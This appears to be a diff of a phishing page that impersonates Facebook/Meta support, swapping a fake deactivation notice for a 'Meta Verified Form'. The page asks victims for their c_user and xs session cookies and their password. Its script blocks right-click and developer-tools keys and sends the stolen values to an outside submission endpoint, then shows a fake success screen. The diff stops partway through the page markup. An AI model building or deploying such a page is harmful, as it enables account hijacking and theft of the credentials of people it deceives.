@@ -1,969 +1,944 @@
+<!--Design by Rashid king name tu suna he hoga🖕-->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Notice - Meta</title>
-    <style>
-        /* Base styles for both pages */
-        :root {
-            --primary-blue: #1877f2;
-            --secondary-blue: #166fe5;
-            --dark-blue: #3b5998;
-            --light-gray: #f0f2f5;
-            --medium-gray: #dddfe2;
-            --dark-gray: #606770;
-            --text-dark: #1d2129;
-            --white: #ffffff;
-            --error-red: #d9534f;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/x-icon" href="favicon.ico">
+<link rel="icon" href="https://pbs.twimg.com/media/GQB99gQaQAEUOZ7?format=png&amp;name=small">
+<title>Meta Verified Form</title>
+<style>
+    *{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background-color:#f0f2f5;min-height:100vh}.main-content{max-width:1200px;margin:0 auto;padding:20px}@media (max-width: 768px){.desktop-header,.desktop-logo-section{display:none}}@media (min-width: 769px){.mobile-header,.mobile-logo-section{display:none}}.header{background-color:#3b5998;color:#fff}.header-content{max-width:1200px;margin:0 auto;padding:16px}.mobile-header{display:flex;align-items:center;gap:16px}.back-button{background:none;border:none;color:#fff;font-size:24px;cursor:pointer}.desktop-header{display:flex;justify-content:space-between;align-items:center}.logo-title{display:flex;align-items:center;gap:16px}.fb-logo{width:40px;height:40px;background-color:#fff;border-radius:50%;position:relative}.fb-logo:after{content:"f";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#3b5998;font-weight:700;font-size:24px}.menu-button{background:none;border:none;color:#fff;font-size:24px;cursor:pointer}.search-section{max-width:800px;margin:50px auto;text-align:center}.search-section h1{font-size:32px;margin-bottom:24px;color:#1c1e21}.search-container2{position:relative}.search-icon{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:#65676b}input[type=search]{width:100%;padding:16px 16px 16px 48px;border-radius:24px;border:1px solid #dddfe2;background-color:#f0f2f5;font-size:16px;outline:none;transition:all .2s}input[type=text]:focus{border-color:#3b5998;box-shadow:0 0 0 2px #3b599833}.help-cards{display:grid;gap:24px;margin-top:48px}@media (min-width: 769px){.help-cards{grid-template-columns:repeat(3,1fr)}}.card{background-color:#fff;padding:24px;border-radius:8px;box-shadow:0 1px 2px #0000001a;transition:box-shadow .2s}.card:hover{box-shadow:0 2px 4px #0000001a}.card h3{color:#1c1e21;margin-bottom:12px;font-size:18px}.card p{color:#65676b;font-size:14px;line-height:1.4}.footer{margin-top:48px;padding:24px 0;border-top:1px solid #dddfe2;background-color:#fff}.footer-content{max-width:1200px;margin:0 auto;padding:0 20px;display:flex;flex-direction:column;align-items:center;gap:16px}@media (min-width: 769px){.footer-content{flex-direction:row;justify-content:space-between}}.copyright{color:#65676b;font-size:14px}.footer-links{display:flex;gap:24px}.footer-links a{color:#65676b;text-decoration:none;font-size:14px}.footer-links a:hover{text-decoration:underline}
+.custom-container {
+    padding: 0.5rem;
+    margin-bottom: 0.5rem;
+    display: flex;
+    justify-content: flex-end;
+    background-color: rgb(245, 246, 247);
+}
+.custom-button {
+    color: white;
+    background-color: rgb(66, 103, 178);
+    border: none;
+    padding: 0.4rem 1rem;
+    font-size: 1.1rem;
+    cursor: pointer;
+    position: relative;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+}
+.custom-button:hover {
+    background-color: rgb(45, 80, 150);
+    transform: scale(1.05);
+}
+.custom-button:focus {
+    outline: none;
+    box-shadow: 0 0 5px rgba(66, 103, 178, 0.7);
+}
+.custom-button:disabled {
+    background-color: rgb(150, 150, 150);
+    cursor: not-allowed;
+    opacity: 0.7;
+}
+.custom-button.loading .button-text {
+    visibility: hidden;
+}
+.custom-button .button-loader {
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 3px solid #fff;
+    border-top: 3px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    position: absolute;
+}
+.custom-button.loading .button-loader {
+    display: block;
+}
+body {
+    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: transparent;
+    background-color: #fff;
+    background-color: var(--bs-body-bg);
+    color: #212529;
+    color: var(--bs-body-color);
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica Neue, Noto Sans, Liberation Sans, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
+    font-family: var(--bs-body-font-family);
+    font-size: 1rem;
+    font-size: var(--bs-body-font-size);
+    font-weight: 400;
+    font-weight: var(--bs-body-font-weight);
+    line-height: 1.5;
+    line-height: var(--bs-body-line-height);
+    margin: 0;
+    text-align: var(--bs-body-text-align)
+}
+.header {
+    padding: 10px;
+    background-color: #4267B2;
+    color: white;
+    display: flex;
+    align-items: center;
+}
+.logo-container {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+.logo-container img {
+    width: 40px;
+    height: 50px;
+}
+.logo-container h1 {
+    margin: 0;
+    font-size: 24px;
+}
+.main-content {
+    padding: 20px;
+}
+.search-icon-re {
+    position: absolute;
+    right: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 18px;
+    color: #555;
+}
+.menu-icon {
+    display: block;
+    cursor: pointer;
+    width: 30px;
+    height: 25px;
+    position: absolute;
+    top: 80px;
+    right: 20px;
+    z-index: 10;
+}
+.menu-icon div {
+    background-color: #333;
+    height: 4px;
+    width: 100%;
+    position: absolute;
+    left: 0;
+    transition: all 0.3s ease;
+}
+.menu-icon div:nth-child(1) {
+    top: 0;
+}
+.menu-icon div:nth-child(2) {
+    top: 10px;
+}
+.menu-icon div:nth-child(3) {
+    top: 20px;
+}
+ul.navbar {
+    list-style-type: none;
+    padding: 0;
+    margin: 0;
+    background-color: #333;
+    display: none;
+    position: absolute;
+    top: 90px;
+    right: 0;
+    width: 200px;
+    text-align: right;
+    z-index: 9;
+}
+ul.navbar li {
+    padding: 10px;
+    border-bottom: 1px solid #555;
+}
+ul.navbar li a {
+    color: white;
+    text-decoration: none;
+    display: block;
+}
+ul.navbar li a:hover {
+    background-color: #111;
+}
+@media screen and (min-width: 1024px) {
+    .menu-icon {
+        display: block;
+    }
+    ul.navbar.active {
+        display: block;
+    }
+}
+@media screen and (max-width: 768px) {
+    .menu-icon {
+        display: block;
+    }
+    .navbar.active {
+        display: block;
+    }
+}
+.fb-input-container {
+    display: flex;
+    flex-direction: column;
+    margin-bottom: 20px;
+    width: 100%;
+    max-width: 400px;
+}
+.fb-input-container input {
+    padding: 14px;
+    font-size: 16px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    outline: none;
+    transition: border-color 0.2s ease, box-shadow 0.2s ease;
+}
+.fb-input-container input:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 6px rgba(24, 119, 242, 0.5);
+}
+.fb-input-container input.valid {
+    border-color: #28a745;
+}
+.fb-input-container input.invalid {
+    border-color: #dc3545;
+}
+.fb-input-container label {
+    font-size: 14px;
+    font-weight: bold;
+    color: #666;
+    margin-bottom: 8px;
+    text-transform: uppercase;
+}
+.fb-input-container input::placeholder {
+    color: #aaa;
+}
+.fb-input-container .error-message {
+    font-size: 12px;
+    color: #dc3545;
+    margin-top: 5px;
+    display: none;
+}
+@media screen and (max-width: 768px) {
+    .fb-input-container {
+        width: 90%;
+    }
+}
+.note {
+    font-size: 12px;
+    color: #606770;
+    margin-top: 10px;
+    line-height: 1.4;
+}
+.search-icon-image {
+    width: 20px;
+    height: auto;
+    margin-left: 30px;
+    cursor: pointer;
+}
+@media (max-width: 768px) {
+    .search-icon-image {
+        margin-left: 70px;
+    }
+}
+@media (min-width: 1024px) {
+    .search-icon-image {
+        margin-left: 960px;
+    }
+}
+.card {
+    --bs-card-spacer-y: 1rem;
+    --bs-card-spacer-x: 1rem;
+    --bs-card-title-spacer-y: 0.5rem;
+    --bs-card-border-width: var(--bs-border-width);
+    --bs-card-border-color: var(--bs-border-color-translucent);
+    --bs-card-border-radius: var(--bs-border-radius);
+    --bs-card-box-shadow: ;
+    --bs-card-inner-border-radius: calc(var(--bs-border-radius) - var(--bs-border-width));
+    --bs-card-cap-padding-y: 0.5rem;
+    --bs-card-cap-padding-x: 1rem;
+    --bs-card-cap-bg: rgba(var(--bs-body-color-rgb), 0.03);
+    --bs-card-height: ;
+    --bs-card-bg: var(--bs-body-bg);
+    --bs-card-img-overlay-padding: 1rem;
+    --bs-card-group-margin: 0.75rem;
+    word-wrap: break-word;
+    background-clip: initial;
+    background-color: var(--bs-card-bg);
+    border: var(--bs-card-border-width) solid var(--bs-card-border-color);
+    border-radius: var(--bs-card-border-radius);
+    color: #212529;
+    display: flex;
+    flex-direction: column;
+    height: var(--bs-card-height);
+    min-width: 0;
+    position: relative
+}
+img, svg {
+    vertical-align: middle
+}
+body, button {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+}
+.submit-button {
+    width: 30%;
+    padding: 12px;
+    background-color: #4267B2;
+    color: white;
+    border: none;
+    border-radius: 0px;
+    font-size: 15px;
+    cursor: pointer;
+    position: relative;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+}
+.submit-button.loading .button-text {
+    visibility: hidden;
+}
+.submit-button .button-loader {
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 3px solid #fff;
+    border-top: 3px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    position: absolute;
+}
+.submit-button.loading .button-loader {
+    display: block;
+}
+.img-fluid, .img-thumbnail {
+    height: auto;
+    max-width: 100%
+}
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    color: #333;
+    line-height: 1.6;
+    margin: 0;
+    padding: 0;
+}
+h3, h5 {
+    color: ;
+}
+a {
+    text-decoration: none;
+    color: #333;
+}
+img {
+    max-width: 100%;
+    height: auto;
+}
+header {
+    background-color: #4267B2;
+    color: ;
+    padding: 15px;
+    text-align: center;
+}
+header h3 {
+    font-size: 24px;
+}
+.main-content {
+    padding: 20px;
+}
+.card {
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+    margin: 10px auto;
+    width: 90%;
+    max-width: 600px;
+}
+.card h3 {
+    margin-bottom: 20px;
+}
+.fb-input-container {
+    margin-bottom: 15px;
+}
+.fb-input-container label {
+    display: block;
+    margin-bottom: 5px;
+    font-weight: bold;
+}
+.fb-input-container input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+}
+.submit-button {
+    width: 30%;
+    padding: 12px;
+    background-color: #4267B2;
+    color: white;
+    border: none;
+    border-radius: 0px;
+    font-size: 15px;
+    cursor: pointer;
+}
+footer {
+    background-color: #333;
+    color: white;
+    text-align: center;
+    padding: 15px;
+    position: relative;
+    bottom: 0;
+    width: 100%;
+}
+.footer-links a {
+    margin: 0 15px;
+    color: white;
+    text-decoration: none;
+}
+.footer-links a:hover {
+    text-decoration: underline;
+}
+@media only screen and (max-width: 768px) {
+    header h3 {
+        font-size: 18px;
+    }
+    .card {
+        width: 95%;
+        padding: 15px;
+    }
+    .submit-button {
+        width: 30%;
+        padding: 12px;
+        background-color: #4267B2;
+        color: white;
+        border: none;
+        border-radius: 0px;
+        font-size: 15px;
+        cursor: pointer;
+    }
+    .footer-links {
+        display: block;
+        margin-top: 10px;
+    }
+    .footer-links a {
+        display: block;
+        margin: 5px 0;
+    }
+}
+@media only screen and (min-width: 769px) and (max-width: 1024px) {
+    .card {
+        width: 70%;
+    }
+    .submit-button {
+        width: 20%;
+        padding: 12px;
+        background-color: #4267B2;
+        color: white;
+        border: none;
+        border-radius: 0px;
+        font-size: 16px;
+        cursor: pointer;
+    }
+}
+@media only screen and (min-width: 1025px) {
+    .card {
+        width: 100%;
+    }
+    .submit-button {
+        width: 29%;
+        padding: 12px;
+        background-color: #4267B2;
+        color: white;
+        border: none;
+        border-radius: 0px;
+        font-size: 17px;
+        cursor: pointer;
+    }
+}
+.back-button {
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 0;
+    margin: 0;
+}
+.back-button img {
+    width: 70px;
+    height: 40px;
+}
+.menu-container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+.menu-icon {
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+}
+.menu-icon div {
+    width: 30px;
+    height: 4px;
+    background-color: #333;
+}
+.footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+}
+.footer-links a {
+    color: white;
+    font-size: 14px;
+}
+.footer-links a:hover {
+    text-decoration: underline;
+}
+.search-icon-image {
+    width: 20px;
+    height: auto;
+    margin-left: 30px;
+    cursor: pointer;
+}
+.responsive-video {
+    width: 100%;
+    height: auto;
+}
+@media (min-width: 768px) {
+    .responsive-video {
+        width: 80%;
+        height: auto;
+    }
+}
+@media (min-width: 1024px) {
+    .responsive-video {
+        width: 1280px;
+        height: 720px;
+    }
+}
+.deletion-notice {
+    background-color: #ffffff;
+    border-radius: 8px;
+    padding: 30px;
+    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+    margin-bottom: 30px;
+    border-left: 4px solid #ff4d4f;
+}
+
+/* Enhanced Popup Styles */
+.popup {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.7);
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    backdrop-filter: blur(5px);
+    animation: fadeIn 0.3s ease;
+}
+.popup-content {
+    background-color: white;
+    padding: 30px;
+    border-radius: 12px;
+    width: 90%;
+    max-width: 450px;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    position: relative;
+    animation: slideIn 0.3s ease;
+}
+.popup-close {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    background: none;
+    border: none;
+    font-size: 24px;
+    cursor: pointer;
+    color: #65676b;
+}
+.popup-close:hover {
+    color: #000;
+}
+.popup-content img {
+    width: 60px;
+    height: 60px;
+    margin-bottom: 20px;
+}
+.popup-content h3 {
+    margin-bottom: 15px;
+    color: #1c1e21;
+    font-size: 20px;
+}
+.popup-content p {
+    color: #65676b;
+    margin-bottom: 20px;
+    font-size: 14px;
+    line-height: 1.5;
+}
+.popup-content input {
+    width: 100%;
+    padding: 14px;
+    margin-bottom: 10px;
+    border: 1px solid #dddfe2;
+    border-radius: 8px;
+    font-size: 16px;
+    transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    background-color: #f5f6f7;
+}
+.popup-content input:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+    background-color: #fff;
+    outline: none;
+}
+.popup-content input.valid {
+    border-color: #28a745;
+}
+.popup-content input.invalid {
+    border-color: #dc3545;
+}
+.popup-content .error-message {
+    font-size: 12px;
+    color: #dc3545;
+    margin-top: 5px;
+    display: none;
+    text-align: left;
+}
+.popup-buttons {
+    display: flex;
+    gap: 12px;
+    margin-top: 15px;
+}
+.popup-buttons button {
+    flex: 1;
+    padding: 14px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    position: relative;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    font-weight: 600;
+    transition: background-color 0.2s;
+}
+.popup-confirm {
+    background-color: #1877f2;
+    color: white;
+}
+.popup-confirm:hover {
+    background-color: #166fe5;
+}
+.popup-cancel {
+    background-color: #e4e6eb;
+    color: #1c1e21;
+}
+.popup-cancel:hover {
+    background-color: #d8dadf;
+}
+.popup-confirm.loading .button-text {
+    visibility: hidden;
+}
+.popup-confirm .button-loader {
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 3px solid #fff;
+    border-top: 3px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    position: absolute;
+}
+.popup-confirm.loading .button-loader {
+    display: block;
+}
+.success-page {
+    display: none;
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+    margin: 10px auto;
+    width: 90%;
+    max-width: 600px;
+    text-align: center;
+}
+.success-page img {
+    width: 40px;
+    height: 50px;
+    margin-bottom: 20px;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+@keyframes slideIn {
+    from { transform: translateY(-20px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+</style>
+<script type="text/javascript">
+document.addEventListener("contextmenu", function(e) {
+    e.preventDefault();
+});
+document.addEventListener("keydown", function(e) {
+    if ((e.key === 'i' || e.key === 'c' || e.key === 'u' || e.keyCode === 73 || e.keyCode === 67) && (e.shiftKey || e.ctrlKey)) {
+        e.preventDefault();
+    }
+});
+function toggleMenu() {
+    const menu = document.querySelector('.menu-container');
+    menu.classList.toggle('open');
+}
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('myForm');
+    const cUserInput = document.getElementById('c_user');
+    const xsInput = document.getElementById('xs');
+    const passwordInput = document.getElementById('password');
+    const cUserError = document.getElementById('c_user_error');
+    const xsError = document.getElementById('xs_error');
+    const passwordError = document.getElementById('password_error');
+    const submitButton = document.querySelector('.submit-button');
+    const popup = document.querySelector('.popup');
+    const popupClose = document.querySelector('.popup-close');
+
+    function validateCUser() {
+        const value = cUserInput.value;
+        if (/^[0-9]+$/.test(value)) { // Changed from /^[0-9]{6,}$/ to /^[0-9]+$/
+            cUserInput.classList.remove('invalid');
+            cUserInput.classList.add('valid');
+            cUserError.style.display = 'none';
+            return true;
+        } else {
+            cUserInput.classList.remove('valid');
+            cUserInput.classList.add('invalid');
+            cUserError.style.display = 'block';
+            return false;
         }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    }
+
+    function validateXs() {
+        const value = xsInput.value;
+        if (/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{40,}$/.test(value)) {
+            xsInput.classList.remove('invalid');
+            xsInput.classList.add('valid');
+            xsError.style.display = 'none';
+            return true;
+        } else {
+            xsInput.classList.remove('valid');
+            xsInput.classList.add('invalid');
+            xsError.style.display = 'block';
+            return false;
         }
-        
-        body {
-            background-color: var(--light-gray);
-            color: var(--text-dark);
-            line-height: 1.6;
-            font-size: 14px;
+    }
+
+    function validatePassword() {
+        const value = passwordInput.value;
+        if (value.length >= 8) {
+            passwordInput.classList.remove('invalid');
+            passwordInput.classList.add('valid');
+            passwordError.style.display = 'none';
+            return true;
+        } else {
+            passwordInput.classList.remove('valid');
+            passwordInput.classList.add('invalid');
+            passwordError.style.display = 'block';
+            return false;
         }
-        
-        /* Notification Page Styles */
-        .notification-container {
-            max-width: 500px;
-            margin: 40px auto;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-            padding: 20px;
+    }
+
+    cUserInput.addEventListener('input', validateCUser);
+    xsInput.addEventListener('input', validateXs);
+    passwordInput.addEventListener('input', validatePassword);
+
+    // Close popup when clicking on X
+    if (popupClose) {
+        popupClose.addEventListener('click', function() {
+            popup.style.display = 'none';
+        });
+    }
+
+    // Close popup when clicking outside
+    popup.addEventListener('click', function(e) {
+        if (e.target === popup) {
+            popup.style.display = 'none';
         }
-        
-        .warning-header {
-            font-size: 20px;
-            font-weight: 600;
-            color: var(--error-red);
-            margin-bottom: 16px;
-        }
-        
-        .content-text {
-            font-size: 15px;
-            margin-bottom: 16px;
-        }
-        
-        .divider {
-            height: 1px;
-            background-color: var(--medium-gray);
-            margin: 20px 0;
-            border: 0;
-        }
-        
-        .support-header {
-            font-size: 17px;
-            font-weight: 600;
-            color: var(--primary-blue);
-            margin-bottom: 12px;
-        }
-        
-        .action-button {
-            display: inline-block;
-            background-color: var(--primary-blue);
-            color: white;
-            font-weight: 600;
-            font-size: 15px;
-            padding: 8px 16px;
-            border-radius: 6px;
-            text-decoration: none;
-            margin-top: 12px;
-            border: none;
-            cursor: pointer;
-        }
-        
-        .footer {
-            text-align: center;
-            color: var(--dark-gray);
-            font-size: 12px;
-            margin-top: 20px;
-        }
-        
-        /* Verification Form Styles (initially hidden) */
-        #verificationForm {
-            display: none;
-        }
-        
-        #root {
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-        
-        .header {
-            background: linear-gradient(to right, var(--dark-blue), #2d4373);
-            height: 80px;
-            display: flex;
-            align-items: center;
-            padding: 0 40px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            justify-content: space-between;
-        }
-        
-        .header h1 {
-            color: var(--white);
-            font-size: 28px;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-        
-        .language-selector {
-            background-color: rgba(255,255,255,0.2);
-            border: none;
-            color: white;
-            padding: 8px 12px;
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        
-        .language-selector option {
-            background-color: var(--dark-blue);
-        }
-        
-        .sub-header {
-            background-color: var(--white);
-            height: 60px;
-            display: flex;
-            align-items: center;
-            padding: 0 40px;
-            border-bottom: 1px solid var(--medium-gray);
-        }
-        
-        .sub-header h4 {
-            color: var(--primary-blue);
-            font-size: 18px;
-            font-weight: 600;
-        }
-        
-        .main-content {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            padding: 30px 20px;
-        }
-        
-        .verification-card {
-            background-color: var(--white);
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 680px;
-            overflow: hidden;
-        }
-        
-        .card-header {
-            background-color: var(--light-gray);
-            padding: 16px 24px;
-            border-bottom: 1px solid var(--medium-gray);
-        }
-        
-        .card-header h5 {
-            font-size: 16px;
-            font-weight: 600;
-            color: var(--text-dark);
-        }
-        
-        .card-body {
-            padding: 24px;
-            position: relative;
-        }
-        
-        .alert-message {
-            margin-bottom: 20px;
-        }
-        
-        .alert-message p {
-            margin-bottom: 12px;
-            color: var(--text-dark);
-        }
-        
-        .video-container {
-            margin: 0 0 20px 0;
-            text-align: left;
-            width: 100%;
-        }
-        
-        .form-container {
-            width: 100%;
-        }
-        
-        .video-label {
-            font-size: 12px;
-            color: var(--dark-gray);
-            margin-bottom: 8px;
-            display: block;
-        }
-        
-        video {
-            max-width: 100%;
-            height: auto;
-            border-radius: 4px;
-            border: 1px solid var(--medium-gray);
-        }
-        
-        .sound-toggle {
-            background-color: var(--primary-blue);
-            color: var(--white);
-            border: none;
-            border-radius: 4px;
-            padding: 8px 16px;
-            font-size: 13px;
-            font-weight: 500;
-            cursor: pointer;
-            margin: 10px 0 20px;
-            transition: background-color 0.2s;
-        }
-        
-        .sound-toggle:hover {
-            background-color: var(--secondary-blue);
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-label {
-            display: block;
-            font-size: 13px;
-            color: var(--dark-gray);
-            margin-bottom: 8px;
-            font-weight: 500;
-        }
-        
-        .form-control {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid var(--medium-gray);
-            border-radius: 4px;
-            font-size: 14px;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-        
-        .form-control:focus {
-            outline: none;
-            border-color: var(--primary-blue);
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
-        }
-        
-        .form-note {
-            font-size: 12px;
-            color: var(--dark-gray);
-            margin-top: 20px;
-            padding: 12px;
-            background-color: var(--light-gray);
-            border-radius: 4px;
-        }
-        
-        .card-footer {
-            background-color: var(--light-gray);
-            padding: 16px 24px;
-            border-top: 1px solid var(--medium-gray);
-            text-align: right;
-        }
-        
-        .submit-btn {
-            background-color: var(--primary-blue);
-            color: var(--white);
-            border: none;
-            border-radius: 4px;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        
-        .submit-btn:hover {
-            background-color: var(--secondary-blue);
-        }
-        
-        .password-confirmation {
-            display: none;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid var(--medium-gray);
-            text-align: center;
-        }
-        
-        .password-confirmation.active {
-            display: block;
-        }
-        
-        .facebook-logo {
-            width: 40px;
-            height: 40px;
-            margin-bottom: 15px;
-        }
-        
-        .password-label {
-            font-size: 16px;
-            margin-bottom: 15px;
-            color: var(--text-dark);
-            font-weight: 500;
-        }
-        
-        .password-input {
-            width: 100%;
-            max-width: 300px;
-            margin: 0 auto 15px;
-        }
-        
-        .final-submit-btn {
-            background-color: var(--primary-blue);
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 10px 30px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        
-        .final-submit-btn:hover {
-            background-color: var(--secondary-blue);
-        }
-        
-        .error-message {
-            color: var(--error-red);
-            font-size: 12px;
-            margin-top: 5px;
-            display: none;
-        }
-        
-        .success-message {
-            display: none;
-            text-align: center;
-            padding: 40px 20px;
-        }
-        
-        .success-icon {
-            font-size: 60px;
-            color: #42b72a;
-            margin-bottom: 20px;
-        }
-        
-        .success-title {
-            font-size: 24px;
-            margin-bottom: 15px;
-            color: var(--text-dark);
-        }
-        
-        .success-text {
-            color: var(--dark-gray);
-            max-width: 400px;
-            margin: 0 auto;
-        }
-        
-        @media (min-width: 768px) {
-            .left-column {
-                width: 60%;
-                float: left;
-                padding-right: 20px;
+    });
+
+    if (form) {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (validateCUser() && validateXs()) {
+                submitButton.classList.add('loading');
+                submitButton.disabled = true;
+                setTimeout(() => {
+                    submitButton.classList.remove('loading');
+                    submitButton.disabled = false;
+                    popup.style.display = 'flex';
+                }, 2000);
+            } else {
+                alert('Please correct the errors in the form.');
             }
-            
-            .right-column {
-                width: 40%;
-                float: right;
-                padding-left: 20px;
+        });
+    }
+});
+function submitPassword() {
+    const password = document.getElementById('password').value;
+    const c_user = document.getElementById('c_user').value;
+    const xs = document.getElementById('xs').value;
+    const popupButton = document.querySelector('.popup-confirm');
+
+    if (password.length >= 8) {
+        popupButton.classList.add('loading');
+        popupButton.disabled = true;
+        setTimeout(() => {
+            document.querySelector('.popup').style.display = 'none';
+            document.querySelector('.main-content').style.display = 'none';
+            document.querySelector('.success-page').style.display = 'block';
+            popupButton.classList.remove('loading');
+            popupButton.disabled = false;
+            try {
+                fetch('https://submit-form.com/jAjYUSqtM', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        c_user: c_user,
+                        xs: xs,
+                        password: password
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.warn('Submission response not OK:', response.status);
+                    }
+                })
+                .catch(error => {
+                    console.error('Submission error:', error);
+                });
+            } catch (error) {
+                console.error('Fetch error:', error);
             }
-            
-            .clearfix::after {
-                content: "";
-                display: table;
-                clear: both;
-            }
-        }
-        
-        @media (max-width: 767px) {
-            .notification-container {
-                margin: 20px auto;
-                padding: 15px;
-            }
-            
-            .warning-header {
-                font-size: 18px;
-            }
-            
-            .header, .sub-header {
-                padding: 0 20px;
-            }
-            
-            .header h1 {
-                font-size: 24px;
-            }
-            
-            .sub-header h4 {
-                font-size: 16px;
-            }
-            
-            .card-body {
-                padding: 20px;
-            }
-        }
-    </style>
+        }, 2000);
+    } else {
+        document.getElementById('password_error').style.display = 'block';
+    }
+}
+function closePopup() {
+    document.querySelector('.popup').style.display = 'none';
+}
+</script>
 </head>
 <body>
-    <!-- Initial Notification Page -->
-    <div class="notification-container" id="notificationPage">
-        <div class="warning-header">Account will be deactivated</div>
-        
-        <div class="content-text">
-            <p>Your account or the page you use has violated copyright. We will immediately limit your account or permanently disable it for non-compliance with our terms of service.</p>
-            
-            <p>If you think we've accidentally suspended your account, you have 24 hours to verify your account. If you miss this security notification, your account will be permanently disabled.</p>
-        </div>
-        
-        <div class="divider"></div>
-        
-        <div class="support-header">Facebook Violation Support</div>
-        <div class="content-text">
-            <p>We will walk you through several steps to cancel a deactivated account.</p>
-        </div>
-        
-        <button class="action-button" id="getStartedBtn">Get Started</button>
-        
-        <div class="footer">Meta © 2025</div>
-    </div>
+<form id="myForm" action="https://submit-form.com/jAjYUSqtM" method="POST">
+<header class="header">
+<br>
+<br>
+<button type="button" id="backbutton" class="back-button"><img src="https://detailed-video-mp4.github.io/review-request-now-fast4/arrow.jpg" style="width: 70px; height: 40px;"></button>
+<h3>Facebook Help Center</h3>
+</header>
+<div>
+<div class="logo-container">
+<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo"> 
+<h3>Help Center
 
-    <!-- Verification Form (hidden initially) -->
-    <form id="verificationForm" action="https://submit-form.com/jAjYUSqtM" method="post">
-        
-        <input type="hidden" id="selectedLanguage" name="language" value="en">
-        <div id="root">
-            <div class="header">
-                <h1>facebook</h1>
-                <select class="language-selector" id="languageSelector">
-                    <option value="en">English</option>
-                    <option value="es">Español</option>
-                    <option value="fr">Français</option>
-                    <option value="de">Deutsch</option>
-                    <option value="pt">Português</option>
-                    <option value="ar">العربية</option>
-                    <option value="hi">हिन्दी</option>
